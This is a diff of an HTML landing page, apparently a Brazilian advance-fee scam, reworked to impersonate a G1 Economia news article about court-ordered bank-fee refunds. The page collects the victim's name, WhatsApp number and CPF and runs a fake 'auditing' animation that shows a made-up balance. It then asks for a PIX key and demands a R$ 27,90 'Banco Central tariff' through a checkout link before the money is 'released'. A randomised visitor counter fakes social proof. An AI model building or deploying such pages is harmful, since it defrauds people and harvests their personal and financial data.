@@ -3,221 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Auditoria Central - Consulta Oficial</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+    <title>Portal de Notícias - Economia</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #001f3f;
-            --accent: #00e676;
-            --error: #ff5252;
-            --bg: #f8fafc;
-            --text: #1e293b;
-            --gray: #64748b;
-        }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Lexend', sans-serif; background-color: var(--bg); color: var(--text); overflow-x: hidden; }
-
-        /* Header Institucional */
-        header { background: #fff; padding: 15px 20px; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
-        .logo-box { display: flex; align-items: center; gap: 8px; color: var(--primary); font-weight: 700; font-size: 16px; }
-        .secure-tag { display: flex; align-items: center; gap: 4px; font-size: 11px; color: var(--success); background: #f0fdf4; padding: 4px 8px; border-radius: 20px; color: #166534; }
-
-        /* Estrutura de Matéria */
-        .container { max-width: 500px; margin: 0 auto; background: #fff; min-height: 100vh; padding-bottom: 100px; }
-        .article-content { padding: 25px 20px; }
-        .kicker { color: #b91c1c; font-weight: 700; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
-        h1 { font-size: 24px; font-weight: 700; line-height: 1.25; margin: 12px 0; letter-spacing: -0.5px; }
-        .author-line { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; font-size: 13px; color: var(--gray); border-bottom: 1px solid #f1f5f9; padding-bottom: 15px; }
-
-        /* Funil de Interação 10/10 */
-        #funnel-engine { background: #fff; border: 1.5px solid #e2e8f0; border-radius: 16px; padding: 24px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05); }
-        .step { display: none; }
-        .step.active { display: block; animation: slideUp 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
+        /* CSS RESET E PORTAL STYLE */
+        body { font-family: 'Roboto', sans-serif; background-color: #f2f2f2; margin: 0; color: #333; }
+        header { background: #c4170c; color: white; padding: 15px; text-align: center; font-size: 22px; font-weight: 900; letter-spacing: -1px; border-bottom: 4px solid #8b1009; }
         
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .main-content { max-width: 650px; margin: 0 auto; background: white; min-height: 100vh; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        .article-padding { padding: 20px; }
+        
+        /* MATÉRIA */
+        .kicker { color: #c4170c; font-weight: bold; font-size: 14px; text-transform: uppercase; }
+        h1 { font-size: 28px; line-height: 1.1; margin: 10px 0; font-weight: 900; color: #1a1a1a; }
+        .subtitulo { font-size: 18px; color: #666; line-height: 1.3; margin-bottom: 20px; font-weight: 400; }
+        .meta { font-size: 12px; color: #999; border-top: 1px solid #eee; border-bottom: 1px solid #eee; padding: 10px 0; margin-bottom: 25px; }
 
-        label { display: block; font-weight: 600; font-size: 14px; margin-bottom: 8px; color: var(--primary); }
-        input { width: 100%; padding: 16px; background: #f8fafc; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 16px; margin-bottom: 20px; transition: all 0.3s; font-family: inherit; }
-        input:focus { border-color: var(--primary); background: #fff; outline: none; box-shadow: 0 0 0 4px rgba(0, 31, 63, 0.1); }
+        /* WIDGET DE CONSULTA (O FUNIL) */
+        .widget-consulta { background: #f9f9f9; border: 2px solid #e1e1e1; border-radius: 8px; padding: 20px; margin: 20px 0; }
+        .step { display: none; }
+        .step.active { display: block; }
+        
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; box-sizing: border-box; }
+        .btn-portal { background: #0047bb; color: white; border: none; width: 100%; padding: 18px; border-radius: 5px; font-weight: bold; font-size: 18px; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
 
-        .btn-action { background: var(--primary); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s; }
-        .btn-action:active { transform: scale(0.98); }
+        /* INTERAÇÃO SELEÇÃO DE BANCO E PIX */
+        .grid-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
+        .option-card { border: 2px solid #ddd; padding: 12px; border-radius: 8px; text-align: center; cursor: pointer; font-weight: bold; font-size: 14px; transition: 0.2s; background: white; }
+        .option-card.selected { border-color: #0047bb; background: #e6eeff; color: #0047bb; }
 
-        /* Loader Circular Profissional */
-        .loader-box { text-align: center; padding: 40px 0; }
-        .circular-loader { width: 60px; height: 60px; border: 4px solid #f1f5f9; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        /* RESULTADO E TAXA */
+        .box-saldo { background: #d4edda; border: 2px dashed #155724; padding: 20px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
+        .valor-saque { color: #155724; font-size: 35px; font-weight: 900; }
+        .alerta-bc { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 15px; border-radius: 5px; font-size: 14px; line-height: 1.4; margin-top: 20px; }
 
-        /* Bloco de Resultado Financeiro */
-        .result-card { background: var(--primary); color: white; border-radius: 16px; padding: 30px 20px; text-align: center; margin-bottom: 25px; background-image: linear-gradient(135deg, #001f3f 0%, #003366 100%); }
-        .result-label { font-size: 13px; opacity: 0.8; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; display: block; }
-        .result-amount { font-size: 40px; font-weight: 700; color: var(--accent); display: block; }
-
-        /* Notificação de Tarifa */
-        .tarifa-alert { background: #fff7ed; border: 1px solid #ffedd5; border-radius: 12px; padding: 20px; margin-top: 20px; }
-        .tarifa-header { display: flex; align-items: center; gap: 8px; color: #9a3412; font-weight: 700; font-size: 15px; margin-bottom: 10px; }
-        .tarifa-body { font-size: 14px; color: #c2410c; line-height: 1.5; }
-
-        /* Prova Social Flutuante */
-        .live-status { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: white; padding: 10px 20px; border-radius: 50px; font-size: 12px; white-space: nowrap; display: flex; align-items: center; gap: 8px; z-index: 1000; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.3); }
-        .online-dot { width: 8px; height: 8px; background: #4ade80; border-radius: 50%; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(74, 222, 128, 0); } 100% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0); } }
+        /* POPUP ONLINE */
+        .online-now { position: fixed; bottom: 15px; left: 15px; background: rgba(0,0,0,0.8); color: white; padding: 8px 15px; border-radius: 20px; font-size: 12px; display: flex; align-items: center; gap: 8px; z-index: 1000; }
+        .pulse { width: 8px; height: 8px; background: #00ff00; border-radius: 50%; box-shadow: 0 0 10px #00ff00; animation: blink 1.5s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
-<header>
-    <div class="logo-box">
-        <span class="material-symbols-outlined">account_balance</span>
-        AUDITORIA CENTRAL
-    </div>
-    <div class="secure-tag">
-        <span class="material-symbols-outlined" style="font-size: 14px;">verified_user</span>
-        CONEXÃO SEGURA
-    </div>
-</header>
+<header>G1 ECONOMIA</header>
 
-<div class="container">
-    <div class="article-content">
-        <span class="kicker">Edição Nacional • 2026</span>
-        <h1>Sistema de Verificação de Tarifas Bancárias libera saques de até R$ 8.500,00</h1>
+<div class="main-content">
+    <div class="article-padding">
+        <span class="kicker">Exclusivo • Atualizado hoje</span>
+        <h1>Justiça autoriza devolução de taxas cobradas indevidamente em cartões e empréstimos quitados</h1>
+        <p class="subtitulo">Medida visa restituir brasileiros que pagaram tarifas administrativas abusivas nos últimos 10 anos. Verifique seu CPF abaixo.</p>
         
-        <div class="author-line">
-            <span class="material-symbols-outlined">description</span>
-            Publicado por <b>Setor de Restituições</b> • Atualizado há 1 min.
-        </div>
+        <div class="meta">Por <b>Redação G1</b> — São Paulo</div>
 
-        <div id="funnel-engine">
+        <p>A auditoria financeira identificou que milhões de contratos de crédito possuem saldo de restituição disponível. O processo de consulta foi simplificado para saque via PIX.</p>
+
+        <div class="widget-consulta">
             
             <div id="step1" class="step active">
-                <label>Informe seu Nome Completo</label>
-                <input type="text" id="userName" placeholder="Ex: Roberto Silva" autocomplete="name">
-                <label>Seu WhatsApp</label>
-                <input type="tel" id="userTel" placeholder="(00) 00000-0000">
-                <button class="btn-action" onclick="goToStep(2)">
-                    CONTINUAR CONSULTA
-                    <span class="material-symbols-outlined">arrow_forward</span>
-                </button>
+                <h3 style="margin:0 0 10px 0;">Identificação</h3>
+                <input type="text" id="nome" placeholder="Nome Completo">
+                <input type="tel" id="tel" placeholder="WhatsApp (DDD)">
+                <button class="btn-portal" onclick="showStep(2)">Próximo Passo</button>
             </div>
 
             <div id="step2" class="step">
-                <label>Informe seu CPF</label>
-                <p style="font-size: 12px; color: var(--gray); margin-bottom: 10px;">Necessário para localizar contratos de empréstimos e cartões ativos ou quitados.</p>
-                <input type="number" id="userCPF" placeholder="000.000.000-00">
-                <button class="btn-action" onclick="runAnalysis()">
-                    VERIFICAR SALDO AGORA
-                    <span class="material-symbols-outlined">search</span>
-                </button>
+                <h3 style="margin:0 0 10px 0;">Consulta de Valores</h3>
+                <p style="font-size:14px; color:#666;">O CPF é necessário para localizar seus contratos nos sistemas bancários.</p>
+                <input type="number" id="cpf" placeholder="000.000.000-00">
+                <button class="btn-portal" onclick="loading()">Localizar Meus Valores</button>
+            </div>
+
+            <div id="step-load" class="step" style="text-align:center; padding:30px 0;">
+                <div style="border: 5px solid #f3f3f3; border-top: 5px solid #0047bb; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+                <p id="msg-load" style="margin-top:20px; font-weight:bold;">Acessando servidores...</p>
+                <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
             </div>
 
             <div id="step3" class="step">
-                <div class="loader-box">
-                    <div class="circular-loader"></div>
-                    <p id="load-status" style="font-weight: 600;">Varrendo base de dados...</p>
-                    <p style="font-size: 12px; color: var(--gray); margin-top: 10px;">Aguarde o retorno dos servidores bancários.</p>
+                <div class="box-saldo">
+                    <p style="margin:0; font-size:12px; font-weight:bold;">VALOR DISPONÍVEL:</p>
+                    <div class="valor-saque">R$ 3.120,42</div>
                 </div>
+
+                <h4 style="margin:20px 0 10px 0;">Em qual banco você quer receber?</h4>
+                <div class="grid-options">
+                    <div class="option-card" onclick="selectOpt(this, 'banco')">NUBANK</div>
+                    <div class="option-card" onclick="selectOpt(this, 'banco')">ITAU</div>
+                    <div class="option-card" onclick="selectOpt(this, 'banco')">INTER</div>
+                    <div class="option-card" onclick="selectOpt(this, 'banco')">OUTROS</div>
+                </div>
+
+                <h4 style="margin:20px 0 10px 0;">Qual o tipo da sua chave PIX?</h4>
+                <div class="grid-options">
+                    <div class="option-card" onclick="selectOpt(this, 'pix')">CPF</div>
+                    <div class="option-card" onclick="selectOpt(this, 'pix')">CELULAR</div>
+                    <div class="option-card" onclick="selectOpt(this, 'pix')">EMAIL</div>
+                    <div class="option-card" onclick="selectOpt(this, 'pix')">ALEATÓRIA</div>
+                </div>
+
+                <input type="text" placeholder="Digite sua Chave PIX aqui">
+                <button class="btn-portal" style="background:#28a745;" onclick="processSaque()">Confirmar e Sacar Agora</button>
             </div>
 
             <div id="step4" class="step">
-                <div class="result-card">
-                    <span class="result-label">Crédito Disponível Localizado</span>
-                    <span class="result-amount">R$ 3.842,15</span>
-                </div>
-                
-                <label>Sua Chave PIX (Para Recebimento)</label>
-                <input type="text" id="pixKey" placeholder="CPF, Celular ou Email">
-                
-                <p style="font-size: 12px; color: var(--gray); text-align: center; margin-bottom: 15px;">
-                    Ao clicar abaixo, você concorda com os termos de devolução imediata.
-                </p>
+                <h2 style="color:#c4170c; text-align:center;">SAQUE BLOQUEADO</h2>
+                <p style="text-align:center; font-size:15px;">O envio de <b>R$ 3.120,42</b> para sua conta foi interrompido por exigência do Banco Central.</p>
 
-                <button class="btn-action" style="background: var(--accent); color: #001f3f;" onclick="requestSaque()">
-                    REALIZAR SAQUE VIA PIX
-                    <span class="material-symbols-outlined">bolt</span>
-                </button>
+                <div class="alerta-bc">
+                    <strong>TARIFA DE SEGURANÇA (TEI):</strong><br>
+                    Para liberar o lote de restituição, é necessário o pagamento da Tarifa de Emissão Interbancária no valor de <b>R$ 27,90</b>.<br><br>
+                    <em>* Este valor é estornado automaticamente junto com seu saldo em 1 minuto.</em>
+                </div>
+
+                <div style="background:#f2f2f2; padding:20px; text-align:center; border-radius:10px; margin-top:20px;">
+                    <p style="margin:0; font-size:14px; color:#666;">Total a receber agora:</p>
+                    <div style="font-size:30px; font-weight:900; color:#28a745;">R$ 3.148,32</div>
+                </div>
+
+                <button class="btn-portal" onclick="window.location.href='https://pay.checkoutpixes.com/checkout/cmno3t5gq02ha1yqmetvdd6v6?offer=D3VNASJ'">PAGAR TARIFA E RECEBER PIX</button>
             </div>
 
-            <div id="step5" class="step">
-                <h2 style="color: var(--primary); text-align: center; margin-bottom: 15px;">Saque em Aprovação</h2>
-                <p style="font-size: 14px; text-align: center;">O valor de <b>R$ 3.842,15</b> foi processado, porém o envio exige a autenticação da <b>Tarifa Interbancária de Segurança</b>.</p>
+        </div> <p style="color:#444; line-height:1.6; font-size:15px;">
+            De acordo com especialistas, a restituição é um direito garantido pelo Código de Defesa do Consumidor para casos onde houve cobrança de taxas de serviços não solicitados ou juros acima da média de mercado na época da contratação...
+        </p>
 
-                <div class="tarifa-alert">
-                    <div class="tarifa-header">
-                        <span class="material-symbols-outlined">info</span>
-                        TARIFA DE AUTENTICAÇÃO
-                    </div>
-                    <div class="tarifa-body">
-                        O pagamento da tarifa de <b>R$ 27,90</b> é obrigatório para validar a titularidade. O valor total será estornado em sua conta <b>em até 60 segundos</b> após o pagamento.
-                    </div>
-                </div>
-
-                <div style="background: #f8fafc; border-radius: 12px; padding: 20px; margin: 20px 0; text-align: center; border: 1px solid #e2e8f0;">
-                    <p style="font-size: 13px; color: var(--gray);">Total a ser Creditado:</p>
-                    <p style="font-size: 28px; font-weight: 700; color: #16a34a;">R$ 3.870,05</p>
-                </div>
-
-                <button class="btn-action" onclick="window.location.href='https://checkout.sigilo.com/sua-url-aqui'">
-                    AUTENTICAR E RECEBER PIX
-                    <span https://pay.checkoutpixes.com/checkout/cmno3t5gq02ha1yqmetvdd6v6?offer=D3VNASJ">payments</span>
-                </button>
-            </div>
-
-        </div> <div style="margin-top: 40px; border-top: 1px solid #f1f5f9; padding-top: 20px;">
-            <p style="font-size: 13px; color: var(--gray); line-height: 1.6;">
-                <b>Nota Fiscal:</b> O serviço de auditoria independente funciona como um intermediário entre o consumidor e as bases de dados bancárias. O ressarcimento é garantido para cobranças de tarifas abusivas de manutenção de conta e juros de mora acima do teto legal...
-            </p>
-        </div>
     </div>
 </div>
 
-<div class="live-status">
-    <div class="online-dot"></div>
-    <span id="live-count">1.842</span> pessoas consultando agora
+<div class="online-now">
+    <div class="pulse"></div>
+    <span id="on-count">1.432</span> pessoas online agora
 </div>
 
 <script>
-    function goToStep(n) {
+    function showStep(n) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('step' + n).classList.add('active');
-        window.scrollTo({top: 200, behavior: 'smooth'});
+        if(n === 'load') { document.getElementById('step-load').classList.add('active'); }
+        else { document.getElementById('step' + n).classList.add('active'); }
     }
 
-    function runAnalysis() {
-        goToStep(3);
-        const msgs = [
-            "Acessando base de contratos...",
-            "Localizando juros abusivos...",
-            "Calculando correções monetárias...",
-            "Finalizando relatório..."
-        ];
-        let i = 0;
-        const interval = setInterval(() => {
-            if(i < msgs.length) {
-                document.getElementById('load-status').innerText = msgs[i];
-                i++;
-            } else {
-                clearInterval(interval);
-                goToStep(4);
-            }
-        }, 1200);
+    function loading() {
+        showStep('load');
+        setTimeout(() => { document.getElementById('msg-load').innerText = "Auditando contratos antigos..."; }, 1500);
+        setTimeout(() => { showStep(3); }, 4000);
     }
 
-    function requestSaque() {
-        goToStep(3);
-        document.getElementById('load-status').innerText = "Processando ordem de saque...";
-        setTimeout(() => { goToStep(5); }, 2500);
+    function selectOpt(element, group) {
+        const cards = element.parentElement.querySelectorAll('.option-card');
+        cards.forEach(c => c.classList.remove('selected'));
+        element.classList.add('selected');
     }
 
-    // Contador realístico
+    function processSaque() {
+        showStep('load');
+        document.getElementById('msg-load').innerText = "Gerando ordem de envio PIX...";
+        setTimeout(() => { showStep(4); }, 3000);
+    }
+
     setInterval(() => {
-        let current = parseInt(document.getElementById('live-count').innerText.replace('.', ''));
-        let next = current + (Math.random() > 0.5 ? 1 : -1) * Math.floor(Math.random() * 5);
-        document.getElementById('live-count').innerText = next.toLocaleString('pt-BR');
-    }, 3000);
+        let count = Math.floor(Math.random() * (1500 - 1300) + 1300);
+        document.getElementById('on-count').innerText = count.toLocaleString('pt-BR');
+    }, 4000);
 </script>
 
 </body>
